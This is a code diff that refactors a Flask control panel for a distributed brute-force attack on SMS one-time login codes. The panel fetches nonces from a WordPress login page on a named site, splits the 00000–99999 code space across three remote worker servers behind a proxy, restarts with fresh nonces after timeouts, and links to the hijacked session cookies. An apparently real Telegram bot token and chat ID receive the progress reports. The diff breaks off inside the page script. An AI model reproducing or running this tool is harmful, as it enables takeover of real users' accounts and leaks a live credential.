@@ -4,656 +4,595 @@ from flask_socketio import SocketIO, emit
 import threading
 import time
 from bs4 import BeautifulSoup
-import uuid
+import logging
+
+# ==============================================================================
+# Configuration
+# ==============================================================================
 
 app = Flask(__name__)
 socketio = SocketIO(app)
 
-# Telegram configuration
+# Configure logging
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+
+# --- Telegram Configuration ---
+# It's better to load these from environment variables or a config file
 TELEGRAM_BOT_TOKEN = "6374641003:AAFG0isVhi6pxBzZDythU96FaTrtEiVQIHY"
 TELEGRAM_CHAT_ID = "-4796694839"
 
+# --- Remote Worker Servers ---
 REMOTE_SERVERS = [
     "http://23.95.197.222:5000",
     "http://198.12.88.145:5000",
     "http://192.227.134.68:5000",
 ]
 
-RANGES = [
+# --- Default OTP Code Ranges for Full Scan ---
+# Distributes the 0-99999 range among the servers
+FULL_SCAN_RANGES = [
     (0, 33333),
     (33333, 66666),
     (66666, 99999),
 ]
 
+# ==============================================================================
+# Global State
+# ==============================================================================
 
-progress_log = []
-found_success = False
-success_codes = []
-proxy_setting = ""
-current_operation = {}
+# Using a dictionary for better state management
+class AppState:
+    def __init__(self):
+        self.progress_log = []
+        self.found_success = False
+        self.success_codes = []
+        self.proxy_setting = ""
+        self.current_operation = {}
+        self.lock = threading.Lock()
+        self.stop_event = threading.Event()
 
-# Telegram message sending function
+    def reset(self):
+        with self.lock:
+            self.progress_log.clear()
+            self.found_success = False
+            self.success_codes.clear()
+            self.current_operation = {}
+            self.stop_event.clear()
+
+    def add_log(self, message):
+        with self.lock:
+            self.progress_log.append(message)
+        logging.info(message)
+        send_to_telegram(message)
+        socketio.emit('update_progress', {'log': message})
+
+    def set_success(self, server, code):
+        with self.lock:
+            if self.found_success:
+                return # Already found a code
+            self.found_success = True
+            self.success_codes.append({
+                "server": server,
+                "code": code,
+                "cookie_link": f"{server}/last_cookie"
+            })
+            self.stop_event.set() # Signal all threads to stop
+
+app_state = AppState()
+
+# ==============================================================================
+# Helper Functions
+# ==============================================================================
+
 def send_to_telegram(message):
+    """Sends a message to the configured Telegram chat."""
+    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+    payload = {
+        "chat_id": TELEGRAM_CHAT_ID,
+        "text": message,
+        "parse_mode": "HTML"
+    }
     try:
-        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-        payload = {
-            "chat_id": TELEGRAM_CHAT_ID,
-            "text": message,
-            "parse_mode": "HTML"
-        }
         response = requests.post(url, json=payload, timeout=10)
         response.raise_for_status()
         return True
-    except Exception as e:
-        print(f"Failed to send Telegram message: {str(e)}")
+    except requests.exceptions.RequestException as e:
+        logging.error(f"Failed to send Telegram message: {e}")
         return False
 
-def get_proxy_from_central():
-    return "socks5://new_user:new_pass@new_host:new_port"
-
-def update_proxy_from_central():
-    global proxy_setting
-    while True:
-        if not proxy_setting:
-            new_proxy = get_proxy_from_central()
-            proxy_setting = new_proxy
-            message = f"🔄 Proxy updated: {new_proxy}"
-            progress_log.append(message)
-            send_to_telegram(message)
-            socketio.emit('update_progress', {'log': progress_log[-1]})
-        time.sleep(1)
-
-threading.Thread(target=update_proxy_from_central, daemon=True).start()
-
 def fetch_nonce(host, mobile):
+    """Fetches the login_otp_nonce from the target website."""
     try:
-        response = requests.get(f"https://{host}/login/", timeout=10)
+        # Step 1: Get user_login_nonce
+        login_page_url = f"https://{host}/login/"
+        response = requests.get(login_page_url, timeout=15)
         response.raise_for_status()
         soup = BeautifulSoup(response.text, 'html.parser')
         user_login_nonce = soup.find('input', {'id': 'user_login_nonce'})['value']
-        
-        response = requests.post(
-            f"https://{host}/wp-admin/admin-ajax.php",
-            headers={
-                "accept": "*/*",
-                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
-                "x-requested-with": "XMLHttpRequest"
-            },
-            data=f"user_login_nonce={user_login_nonce}&_wp_http_referer=%2Flogin%2F&action=kandopanel_user_login&redirect=&log={mobile}&pwd=&otp=1",
-            timeout=10
-        )
-        
-        response = requests.get(f"https://{host}/login/?action=login-by-otp&mobile={mobile}", timeout=10)
+
+        # Step 2: Send initial login request to get OTP sent
+        ajax_url = f"https://{host}/wp-admin/admin-ajax.php"
+        headers = {
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "X-Requested-With": "XMLHttpRequest",
+            "Referer": login_page_url
+        }
+        login_data = f"user_login_nonce={user_login_nonce}&_wp_http_referer=%2Flogin%2F&action=kandopanel_user_login&redirect=&log={mobile}&pwd=&otp=1"
+        requests.post(ajax_url, headers=headers, data=login_data, timeout=15)
+
+        # Step 3: Get the login_otp_nonce from the OTP page
+        otp_page_url = f"https://{host}/login/?action=login-by-otp&mobile={mobile}"
+        response = requests.get(otp_page_url, timeout=15)
         response.raise_for_status()
         soup = BeautifulSoup(response.text, 'html.parser')
         login_otp_nonce = soup.find('input', {'id': 'login_otp_nonce'})['value']
-        
-        message = f"✅ Nonce fetched successfully for {host}"
-        send_to_telegram(message)
+
+        app_state.add_log(f"✅ Nonce fetched successfully for {host}")
         return login_otp_nonce
     except Exception as e:
-        message = f"❌ Failed to fetch nonce for {host}: {str(e)}"
-        progress_log.append(message)
-        send_to_telegram(message)
-        socketio.emit('update_progress', {'log': progress_log[-1]})
+        app_state.add_log(f"❌ Failed to fetch nonce for {host}: {e}")
         return None
 
-def resend_otp(host, mobile, nonce):
+def send_to_remote_worker(server_url, payload):
+    """Sends a start request to a remote worker server."""
     try:
-        response = requests.post(
-            f"https://{host}/wp-admin/admin-ajax.php",
-            headers={
-                "accept": "*/*",
-                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
-                "x-requested-with": "XMLHttpRequest"
-            },
-            data=f"action=resend_otp&mobile={mobile}&nonce={nonce}",
-            timeout=10
-        )
+        response = requests.post(f"{server_url}/start", json=payload, timeout=10)
         response.raise_for_status()
-        if response.json().get("success"):
-            message = f"📤 SMS resent successfully for {mobile}"
-            progress_log.append(message)
-            send_to_telegram(message)
-            socketio.emit('update_progress', {'log': progress_log[-1]})
-            return True
-        return False
-    except Exception as e:
-        message = f"❌ Failed to resend SMS for {mobile}: {str(e)}"
-        progress_log.append(message)
-        send_to_telegram(message)
-        socketio.emit('update_progress', {'log': progress_log[-1]})
-        return False
-
-def auto_stop_and_restart():
-    global current_operation, found_success
-    time.sleep(40 * 60)  # 20 دقیقه صبر
-    stop_all_servers()
-    
-    message = "⏹️ تمام سرورها بعد از ۲۰ دقیقه متوقف شدند"
-    send_to_telegram(message)
-    
-    # منتظر می‌مونیم تا همه سرورها متوقف بشن
-    while True:
-        status = get_worker_status()
-        if all(not data["running"] for data in status.values()):
-            break
-        time.sleep(1)
-    
-    message = "✅ توقف تمام سرورها تأیید شد"
-    send_to_telegram(message)
-    
-    if not found_success and current_operation:
-        # ۲ دقیقه صبر قبل از تلاش برای ارسال OTP
-        message = "⏳ انتظار ۲ دقیقه‌ای قبل از تلاش برای ارسال دوباره OTP"
-        send_to_telegram(message)
-        time.sleep(120)  # ۲ دقیقه
-        
-        # تلاش تا ۳ بار برای گرفتن OTP جدید
-        for attempt in range(1, 4):
-            message = f"🔄 تلاش {attempt} از ۳ برای گرفتن OTP جدید"
-            send_to_telegram(message)
-            new_nonce = fetch_nonce(current_operation['host'], current_operation['mobile'])
-            if new_nonce:
-                # به‌روزرسانی nonce در عملیات فعلی
-                current_operation['nonce'] = new_nonce
-                # ری‌استارت سرورها با پارامترهای قبلی
-                threads = []
-                for i, server in enumerate(REMOTE_SERVERS):
-                    start_r, end_r = current_operation['ranges'][i]
-                    thread = threading.Thread(
-                        target=send_to_remote,
-                        args=(server, current_operation['host'], new_nonce,
-                              current_operation['mobile'], current_operation['connections'],
-                              start_r, end_r)
-                    )
-                    threads.append(thread)
-                    thread.start()
-                
-                for thread in threads:
-                    thread.join()
-                
-                message = f"🔄 عملیات با رنج‌های {current_operation['ranges']} ری‌استارت شد"
-                send_to_telegram(message)
-                
-                # برنامه‌ریزی توقف بعدی
-                threading.Thread(target=auto_stop_and_restart, daemon=True).start()
-                return
-            else:
-                message = f"❌ تلاش {attempt} برای گرفتن OTP جدید شکست خورد"
-                send_to_telegram(message)
-                if attempt < 3:
-                    message = "⏳ انتظار ۱ دقیقه‌ای قبل از تلاش بعدی"
-                    send_to_telegram(message)
-                    time.sleep(60)  # ۱ دقیقه صبر بین تلاش‌ها
-        
-        # اگه بعد از ۳ تلاش موفق نشدیم
-        message = "❌ بعد از ۳ تلاش، OTP جدید دریافت نشد. عملیات متوقف شد."
-        send_to_telegram(message)
-    else:
-        message = "ℹ️ نیازی به ری‌استارت نیست: یا موفقیت پیدا شده یا عملیاتی فعال نیست"
-        send_to_telegram(message)
-
-def send_to_remote(server_url, host, nonce, mobile, connections, start_range, end_range):
-    try:
-        response = requests.post(
-            f"{server_url}/start",
-            json={
-                "host": host,
-                "nonce": nonce,
-                "mobile": mobile,
-                "connections": connections,
-                "startRange": start_range,
-                "endRange": end_range,
-                "proxy": proxy_setting
-            },
-            timeout=10
-        )
-        response.raise_for_status()
-        message = f"📤 درخواست به {server_url} برای رنج {start_range}-{end_range} ارسال شد"
-        progress_log.append(message)
-        send_to_telegram(message)
-        socketio.emit('update_progress', {'log': progress_log[-1]})
+        app_state.add_log(f"✅ Request sent to {server_url} for range {payload['startRange']}-{payload['endRange']}")
     except requests.exceptions.RequestException as e:
-        message = f"❌ ارسال درخواست به {server_url} شکست خورد: {str(e)}"
-        progress_log.append(message)
-        send_to_telegram(message)
-        socketio.emit('update_progress', {'log': progress_log[-1]})
+        app_state.add_log(f"❌ Failed to send request to {server_url}: {e}")
 
-def stop_all_servers():
+def stop_all_workers(manual_stop=False):
+    """Sends stop requests to all remote worker servers."""
+    if manual_stop:
+        app_state.stop_event.set()
+        app_state.add_log("🛑 Manual stop requested by user.")
+
     for server in REMOTE_SERVERS:
         try:
             requests.post(f"{server}/stop", timeout=5)
-            message = f"⏹️ درخواست توقف به {server} ارسال شد"
-            progress_log.append(message)
-            send_to_telegram(message)
-            socketio.emit('update_progress', {'log': progress_log[-1]})
+            logging.info(f"⏹️ Stop request sent to {server}")
         except requests.exceptions.RequestException as e:
-            message = f"❌ توقف {server} شکست خورد: {str(e)}"
-            progress_log.append(message)
-            send_to_telegram(message)
-            socketio.emit('update_progress', {'log': progress_log[-1]})
+            logging.warning(f"⚠️ Could not send stop request to {server}: {e}")
 
-def get_worker_status():
-    global success_codes, found_success
+def get_workers_status():
+    """Retrieves the status from all remote worker servers."""
     status_data = {}
-    for server in REMOTE_SERVERS:
+    with app_state.lock:
+        servers_to_check = list(REMOTE_SERVERS)
+
+    def check_server(server):
         try:
             response = requests.get(f"{server}/status", timeout=5)
             response.raise_for_status()
             status = response.json()
-            status_data[server] = {
-                "running": status["running"],
-                "current_range": status["current_range"],
-                "processed": status["processed"],
-                "error": status["error"]
-            }
-            if status["error"] and "Code" in status["error"] and "found successfully" in status["error"]:
-                found_success = True
+            status_data[server] = status
+            
+            # Check for success message in the error field (as per original logic)
+            if status.get("error") and "found successfully" in status["error"]:
                 code = status["error"].split("Code ")[1].split(" found")[0]
-                if not any(s["code"] == code for s in success_codes):
-                    success_codes.append({"server": server, "code": code, "cookie_link": f"{server}/last_cookie"})
-                message = f"🎉 موفقیت در {server}! کد: {code}\nتوقف تمام سرورها..."
-                progress_log.append(message)
-                send_to_telegram(message)
-                socketio.emit('update_progress', {'log': progress_log[-1]})
-                stop_all_servers()
+                app_state.add_log(f"🎉 Success on {server}! Code: {code}. Stopping all workers...")
+                app_state.set_success(server, code)
+                stop_all_workers()
+
         except requests.exceptions.RequestException as e:
             status_data[server] = {
-                "running": False,
-                "current_range": {"start": "-", "end": "-"},
-                "processed": "-",
-                "error": f"اتصال ناموفق: {str(e)}"
+                "running": False, "current_range": {"start": "-", "end": "-"},
+                "processed": "-", "error": f"Connection failed: {e}"
             }
-            message = f"⚠️ بررسی وضعیت {server} شکست خورد: {str(e)}"
-            send_to_telegram(message)
+
+    threads = [threading.Thread(target=check_server, args=(server,)) for server in servers_to_check]
+    for t in threads: t.start()
+    for t in threads: t.join()
+
     return status_data
+
+# ==============================================================================
+# Background Task Manager
+# ==============================================================================
+
+def operation_manager(operation_details):
+    """Manages the lifecycle of an OTP cracking operation, including auto-restart."""
+    app_state.add_log("🔄 Operation Manager Started.")
+    
+    # The main loop for the operation, allows for retries.
+    for attempt in range(1, 4): # Max 3 attempts
+        if app_state.stop_event.is_set():
+            app_state.add_log("Operation cancelled before starting.")
+            break
+
+        app_state.add_log(f"🚀 Starting attempt #{attempt}...")
+
+        # Start workers
+        threads = []
+        for i, server in enumerate(REMOTE_SERVERS):
+            start_r, end_r = operation_details['ranges'][i]
+            payload = {
+                "host": operation_details['host'], "nonce": operation_details['nonce'],
+                "mobile": operation_details['mobile'], "connections": operation_details['connections'],
+                "startRange": start_r, "endRange": end_r, "proxy": app_state.proxy_setting
+            }
+            thread = threading.Thread(target=send_to_remote_worker, args=(server, payload))
+            threads.append(thread)
+            thread.start()
+        for thread in threads: thread.join()
+
+        # Wait for either success, timeout, or manual stop
+        # Timeout is 40 minutes as per original logic
+        stopped = app_state.stop_event.wait(timeout=40 * 60)
+
+        if stopped:
+            if app_state.found_success:
+                app_state.add_log("✅ Operation successful! Manager shutting down.")
+                break # Exit the loop on success
+            else:
+                app_state.add_log("⏹️ Operation stopped manually. Manager shutting down.")
+                break # Exit on manual stop
+        else: # Timeout occurred
+            app_state.add_log("⏳ Timeout reached (40 mins). Stopping workers for restart.")
+            stop_all_workers()
+            time.sleep(5) # Grace period for workers to stop
+
+            app_state.add_log("🔄 Attempting to fetch a new nonce for restart...")
+            new_nonce = fetch_nonce(operation_details['host'], operation_details['mobile'])
+            if new_nonce:
+                operation_details['nonce'] = new_nonce
+                app_state.add_log("✅ New nonce acquired. Restarting operation.")
+                # The loop will continue to the next attempt
+            else:
+                app_state.add_log("❌ Failed to get new nonce. Aborting operation.")
+                break # Exit loop if nonce fetch fails
+
+    app_state.add_log("🔚 Operation Manager Finished.")
+    stop_all_workers() # Final cleanup
+
+# ==============================================================================
+# Flask Routes
+# ==============================================================================
 
 @app.route('/')
 def index():
+    # Modern UI with TailwindCSS and better layout
     return render_template_string('''
     <!DOCTYPE html>
-    <html lang="fa">
+    <html lang="fa" dir="rtl">
     <head>
         <meta charset="UTF-8">
-        <title>بررسی کد OTP - سرور مرکزی</title>
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>سرور مرکزی OTP</title>
         <script src="https://cdn.tailwindcss.com"></script>
         <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.5.1/socket.io.js"></script>
         <style>
-            body { direction: rtl; font-family: Arial, sans-serif; }
-            .container { max-width: 1200px; margin: 0 auto; }
-            #progress-table, #success-table, #operation-table { width: 100%; border-collapse: collapse; margin-top: 20px; }
-            #progress-table th, #progress-table td, #success-table th, #success-table td, #operation-table th, #operation-table td { border: 1px solid #ddd; padding: 12px; text-align: center; }
-            #progress-table th, #success-table th, #operation-table th { background-color: #f2f2f2; font-weight: bold; }
-            #progress-table tr:nth-child(even), #success-table tr:nth-child(even), #operation-table tr:nth-child(even) { background-color: #f9f9f9; }
-            #progress-table tr:hover, #success-table tr:hover, #operation-table tr:hover { background-color: #f1f1f1; }
-            .status-active { color: green; font-weight: bold; }
-            .status-inactive { color: red; font-weight: bold; }
-            .error-cell { color: #d9534f; max-width: 300px; word-wrap: break-word; }
-            .success-link { color: #1e90ff; text-decoration: underline; }
+            body { font-family: 'Vazirmatn', sans-serif; }
+            @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;700&display=swap');
+            .status-active { color: #10B981; } .status-inactive { color: #EF4444; }
+            .loader { border-top-color: #3498db; animation: spin 1s linear infinite; }
+            @keyframes spin { to { transform: rotate(360deg); } }
         </style>
     </head>
-    <body class="bg-gray-100 p-8">
-        <div class="container">
-            <div class="bg-white p-8 rounded-lg shadow-lg">
-                <h1 class="text-3xl font-bold text-center mb-8">بررسی کد OTP - سرور مرکزی</h1>
-                <form id="form" class="space-y-6">
-                    <div>
-                        <label class="block text-sm font-medium text-gray-700">هاست:</label>
-                        <input type="text" id="host" class="mt-1 block w-full p-3 border rounded-lg" value="0an0m.com">
-                    </div>
-                    <div>
-                        <label class="block text-sm font-medium text-gray-700">Nonce:</label>
-                        <input type="text" id="nonce" class="mt-1 block w-full p-3 border rounded-lg" >
-                    </div>
-                    <div>
-                        <label class="block text-sm font-medium text-gray-700">شماره موبایل:</label>
-                        <input type="text" id="mobile" class="mt-1 block w-full p-3 border rounded-lg" value="0">
-                    </div>
-                    <div>
-                        <label class="block text-sm font-medium text-gray-700">تعداد کانکشن‌ها:</label>
-                        <input type="number" id="connections" class="mt-1 block w-full p-3 border rounded-lg" value="20">
-                    </div>
-                    <div>
-                        <label class="block text-sm font-medium text-gray-700">پروکسی (SOCKS5):</label>
-                        <input type="text" id="proxy" class="mt-1 block w-full p-3 border rounded-lg" placeholder="مثال: socks5://user:pass@host:port" value="51.195.229.194:13001">
-                    </div>
-                    <div>
-                        <label class="block text-sm font-medium text-gray-700">نوع اسکن:</label>
-                        <div class="mt-2">
-                            <label class="inline-flex items-center">
-                                <input type="radio" name="scan_type" value="full" class="form-radio" checked>
-                                <span class="mr-2">اسکن کامل (00000-99999)</span>
-                            </label>
-                            <label class="inline-flex items-center mr-6">
-                                <input type="radio" name="scan_type" value="custom" class="form-radio">
-                                <span class="mr-2">اسکن سفارشی</span>
-                            </label>
-                        </div>
-                    </div>
-                    <div id="custom_range" class="hidden space-y-4">
+    <body class="bg-gray-900 text-gray-200 p-4 sm:p-8">
+        <div class="max-w-7xl mx-auto">
+            <header class="text-center mb-8">
+                <h1 class="text-4xl font-bold text-cyan-400">سرور مرکزی OTP</h1>
+                <p class="text-gray-400 mt-2">مدیریت و نظارت بر فرآیند بررسی کد</p>
+            </header>
+
+            <main class="grid grid-cols-1 lg:grid-cols-3 gap-8">
+                <!-- Control Panel -->
+                <div class="lg:col-span-1 bg-gray-800 p-6 rounded-xl shadow-lg">
+                    <h2 class="text-2xl font-bold mb-6 border-b-2 border-cyan-500 pb-2">پنل کنترل</h2>
+                    <form id="control-form" class="space-y-4">
                         <div>
-                            <label class="block text-sm font-medium text-gray-700">شروع رنج:</label>
-                            <input type="number" id="start_range" class="mt-1 block w-full p-3 border rounded-lg" placeholder="مثال: 20000">
+                            <label for="host" class="block text-sm font-medium text-gray-300">هاست</label>
+                            <input type="text" id="host" class="mt-1 block w-full bg-gray-700 border-gray-600 rounded-md shadow-sm p-2" value="0an0m.com">
                         </div>
                         <div>
-                            <label class="block text-sm font-medium text-gray-700">پایان رنج:</label>
-                            <input type="number" id="end_range" class="mt-1 block w-full p-3 border rounded-lg" placeholder="مثال: 30000">
+                            <label for="mobile" class="block text-sm font-medium text-gray-300">شماره موبایل</label>
+                            <input type="text" id="mobile" class="mt-1 block w-full bg-gray-700 border-gray-600 rounded-md shadow-sm p-2" value="09000000000">
+                        </div>
+                        <div>
+                            <label for="nonce" class="block text-sm font-medium text-gray-300">Nonce (اختیاری)</label>
+                            <input type="text" id="nonce" class="mt-1 block w-full bg-gray-700 border-gray-600 rounded-md shadow-sm p-2" placeholder="در صورت خالی بودن، خودکار دریافت می‌شود">
+                        </div>
+                        <div>
+                            <label for="connections" class="block text-sm font-medium text-gray-300">تعداد کانکشن‌ها</label>
+                            <input type="number" id="connections" class="mt-1 block w-full bg-gray-700 border-gray-600 rounded-md shadow-sm p-2" value="20">
+                        </div>
+                        <div>
+                            <label for="proxy" class="block text-sm font-medium text-gray-300">پروکسی (SOCKS5)</label>
+                            <input type="text" id="proxy" class="mt-1 block w-full bg-gray-700 border-gray-600 rounded-md shadow-sm p-2" placeholder="socks5://user:pass@host:port" value="51.195.229.194:13001">
+                        </div>
+                        
+                        <!-- Scan Type -->
+                        <fieldset>
+                            <legend class="block text-sm font-medium text-gray-300 mb-2">نوع اسکن</legend>
+                            <div class="flex items-center space-x-4 space-x-reverse">
+                                <label><input type="radio" name="scan_type" value="full" class="form-radio text-cyan-500" checked> اسکن کامل</label>
+                                <label><input type="radio" name="scan_type" value="custom" class="form-radio text-cyan-500"> سفارشی</label>
+                            </div>
+                        </fieldset>
+                        <div id="custom_range_container" class="hidden grid grid-cols-2 gap-4">
+                            <input type="number" id="start_range" class="w-full bg-gray-700 border-gray-600 rounded-md p-2" placeholder="شروع">
+                            <input type="number" id="end_range" class="w-full bg-gray-700 border-gray-600 rounded-md p-2" placeholder="پایان">
+                        </div>
+
+                        <!-- Action Buttons -->
+                        <div class="pt-4 space-y-3">
+                            <button type="button" id="start-btn" class="w-full flex justify-center items-center bg-green-600 hover:bg-green-700 text-white font-bold py-2 px-4 rounded-lg transition-colors">
+                                <svg class="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14.752 11.168l-3.197-2.132A1 1 0 0010 9.87v4.263a1 1 0 001.555.832l3.197-2.132a1 1 0 000-1.664z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                                شروع عملیات
+                            </button>
+                            <button type="button" id="stop-btn" class="w-full flex justify-center items-center bg-red-600 hover:bg-red-700 text-white font-bold py-2 px-4 rounded-lg transition-colors" disabled>
+                                <svg class="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 9v6m4-6v6m7-3a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                                توقف عملیات
+                            </button>
+                        </div>
+                    </form>
+                </div>
+
+                <!-- Status & Logs -->
+                <div class="lg:col-span-2 space-y-8">
+                    <!-- Status Table -->
+                    <div class="bg-gray-800 p-6 rounded-xl shadow-lg">
+                        <h2 class="text-2xl font-bold mb-4">وضعیت سرورها</h2>
+                        <div class="overflow-x-auto">
+                            <table class="w-full text-center">
+                                <thead class="border-b border-gray-600">
+                                    <tr>
+                                        <th class="py-2 px-3">سرور</th>
+                                        <th class="py-2 px-3">وضعیت</th>
+                                        <th class="py-2 px-3">رنج</th>
+                                        <th class="py-2 px-3">پیشرفت</th>
+                                        <th class="py-2 px-3">آخرین پیام</th>
+                                    </tr>
+                                </thead>
+                                <tbody id="status-body">
+                                    <!-- Status rows will be injected here -->
+                                </tbody>
+                            </table>
                         </div>
                     </div>
-                    <div class="flex space-x-6">
-                        <button type="button" id="fetch_nonce" class="w-full bg-blue-500 text-white p-3 rounded-lg hover:bg-blue-600">دریافت اطلاعات</button>
-                        <button type="button" id="start" class="w-full bg-green-500 text-white p-3 rounded-lg hover:bg-green-600">شروع</button>
-                        <button type="button" id="stop" class="w-full bg-red-500 text-white p-3 rounded-lg hover:bg-red-600" disabled>توقف</button>
+                    <!-- Success & Logs -->
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
+                        <div class="bg-gray-800 p-6 rounded-xl shadow-lg">
+                            <h2 class="text-2xl font-bold mb-4">کدهای موفق</h2>
+                            <div id="success-body" class="space-y-2">
+                                <p class="text-gray-400">هنوز کدی یافت نشده است.</p>
+                            </div>
+                        </div>
+                        <div class="bg-gray-800 p-6 rounded-xl shadow-lg">
+                             <h2 class="text-2xl font-bold mb-4">لاگ‌ها</h2>
+                             <div id="logs-container" class="h-48 overflow-y-auto bg-gray-900 rounded-md p-2 space-y-1 text-sm">
+                                <!-- Logs will be injected here -->
+                             </div>
+                        </div>
                     </div>
-                </form>
-                <div class="mt-8">
-                    <h2 class="text-xl font-semibold text-center mb-4">وضعیت سرورها</h2>
-                    <table id="progress-table">
-                        <thead>
-                            <tr>
-                                <th>سرور</th>
-                                <th>وضعیت</th>
-                                <th>رنج فعلی</th>
-                                <th>تعداد پردازش‌شده</th>
-                                <th>خطا</th>
-                            </tr>
-                        </thead>
-                        <tbody id="table-body">
-                        </tbody>
-                    </table>
                 </div>
-                <div class="mt-8">
-                    <h2 class="text-xl font-semibold text-center mb-4">موفقیت‌ها</h2>
-                    <table id="success-table">
-                        <thead>
-                            <tr>
-                                <th>سرور</th>
-                                <th>کد موفق</th>
-                                <th>لینک کوکی</th>
-                            </tr>
-                        </thead>
-                        <tbody id="success-body">
-                        </tbody>
-                    </table>
-                </div>
-                <div class="mt-8">
-                    <h2 class="text-xl font-semibold text-center mb-4">عملیات فعلی</h2>
-                    <table id="operation-table">
-                        <thead>
-                            <tr>
-                                <th>هاست</th>
-                                <th>Nonce</th>
-                                <th>موبایل</th>
-                                <th>کانکشن‌ها</th>
-                                <th>پروکسی</th>
-                            </tr>
-                        </thead>
-                        <tbody id="operation-body">
-                        </tbody>
-                    </table>
-                </div>
-            </div>
+            </main>
         </div>
 
         <script>
             const socket = io();
-            const form = document.getElementById('form');
-            const startBtn = document.getElementById('start');
-            const stopBtn = document.getElementById('stop');
-            const fetchNonceBtn = document.getElementById('fetch_nonce');
-            const tableBody = document.getElementById('table-body');
+            const startBtn = document.getElementById('start-btn');
+            const stopBtn = document.getElementById('stop-btn');
+            const statusBody = document.getElementById('status-body');
             const successBody = document.getElementById('success-body');
-            const operationBody = document.getElementById('operation-body');
+            const logsContainer = document.getElementById('logs-container');
 
-            const servers = [
-    "http://23.95.197.222:5000",
-    "http://198.12.88.145:5000",
-    "http://192.227.134.68:5000",
-            ];
+            let servers = [];
 
-            function updateTables() {
-                fetch('/get_status')
-                    .then(response => response.json())
-                    .then(data => {
-                        tableBody.innerHTML = '';
-                        servers.forEach(server => {
-                            const status = data[server] || {
-                                running: false,
-                                current_range: { start: '-', end: '-' },
-                                processed: '-',
-                                error: 'داده‌ای در دسترس نیست'
-                            };
-                            const row = document.createElement('tr');
-                            row.innerHTML = `
-                                <td>${server}</td>
-                                <td class="${status.running ? 'status-active' : 'status-inactive'}">
-                                    ${status.running ? 'فعال' : 'غیرفعال'}
-                                </td>
-                                <td>${status.current_range.start} - ${status.current_range.end}</td>
-                                <td>${status.processed} / ${status.current_range.end}</td>
-                                <td class="error-cell">${status.error || '-'}</td>
-                            `;
-                            tableBody.appendChild(row);
-                        });
-
-                        fetch('/get_success')
-                            .then(response => response.json())
-                            .then(successData => {
-                                successBody.innerHTML = '';
-                                successData.forEach(success => {
-                                    const row = document.createElement('tr');
-                                    row.innerHTML = `
-                                        <td>${success.server}</td>
-                                        <td>${success.code}</td>
-                                        <td><a href="${success.cookie_link}" class="success-link" target="_blank">دانلود کوکی</a></td>
-                                    `;
-                                    successBody.appendChild(row);
-                                });
-                            });
-
-                        fetch('/get_operation')
-                            .then(response => response.json())
-                            .then(opData => {
-                                operationBody.innerHTML = '';
-                                if (opData.host) {
-                                    const row = document.createElement('tr');
-                                    row.innerHTML = `
-                                        <td>${opData.host}</td>
-                                        <td>${opData.nonce}</td>
-                                        <td>${opData.mobile}</td>
-                                        <td>${opData.connections}</td>
-                                        <td>${opData.proxy || '-'}</td>
-                                    `;
-                                    operationBody.appendChild(row);
-                                }
-                            });
-                    });
+            function setButtonState(isBusy) {
+                startBtn.disabled = isBusy;
+                stopBtn.disabled = !isBusy;
+                startBtn.classList.toggle('opacity-50', isBusy);
+                stopBtn.classList.toggle('opacity-50', !isBusy);
             }
 
-            setInterval(updateTables, 5000);
-            updateTables();
+            function addLog(message) {
+                const logEntry = document.createElement('p');
+                logEntry.className = 'text-gray-300 font-mono';
+                logEntry.textContent = `> ${message}`;
+                logsContainer.appendChild(logEntry);
+                logsContainer.scrollTop = logsContainer.scrollHeight;
+            }
 
-            socket.on('connect', () => console.log('اتصال به WebSocket برقرار شد'));
-            socket.on('update_progress', function(data) { console.log('لاگ:', data.log); });
+            function updateStatusTable(statusData) {
+                statusBody.innerHTML = '';
+                servers = Object.keys(statusData);
+                servers.forEach(server => {
+                    const status = statusData[server];
+                    const processed = parseInt(status.processed) || 0;
+                    const end = parseInt(status.current_range.end) || 0;
+                    const start = parseInt(status.current_range.start) || 0;
+                    const total = end > start ? end - start : 0;
+                    const percentage = total > 0 ? ((processed - start) / total * 100).toFixed(1) : 0;
 
+                    const row = document.createElement('tr');
+                    row.className = 'border-b border-gray-700 last:border-none';
+                    row.innerHTML = `
+                        <td class="py-3 px-2 whitespace-nowrap">${new URL(server).hostname}</td>
+                        <td class="py-3 px-2 font-bold ${status.running ? 'status-active' : 'status-inactive'}">${status.running ? 'فعال' : 'غیرفعال'}</td>
+                        <td class="py-3 px-2 font-mono">${status.current_range.start} - ${status.current_range.end}</td>
+                        <td class="py-3 px-2">
+                            <div class="w-full bg-gray-600 rounded-full h-2.5">
+                                <div class="bg-cyan-500 h-2.5 rounded-full" style="width: ${percentage}%"></div>
+                            </div>
+                            <span class="text-xs font-mono">${percentage}%</span>
+                        </td>
+                        <td class="py-3 px-2 text-xs text-gray-400 max-w-xs truncate">${status.error || '-'}</td>
+                    `;
+                    statusBody.appendChild(row);
+                });
+            }
+            
+            function updateSuccessList(successData) {
+                if (successData.length === 0) return;
+                successBody.innerHTML = '';
+                successData.forEach(s => {
+                    const successEntry = document.createElement('div');
+                    successEntry.className = 'bg-green-500/20 p-3 rounded-lg';
+                    successEntry.innerHTML = `
+                        <p class="font-bold">کد: <span class="font-mono text-cyan-300">${s.code}</span></p>
+                        <p class="text-sm">سرور: ${new URL(s.server).hostname}</p>
+                        <a href="${s.cookie_link}" target="_blank" class="text-yellow-400 hover:underline">دانلود کوکی</a>
+                    `;
+                    successBody.appendChild(successEntry);
+                });
+            }
+
+            async function refreshData() {
+                try {
+                    const [statusRes, successRes] = await Promise.all([
+                        fetch('/get_status'),
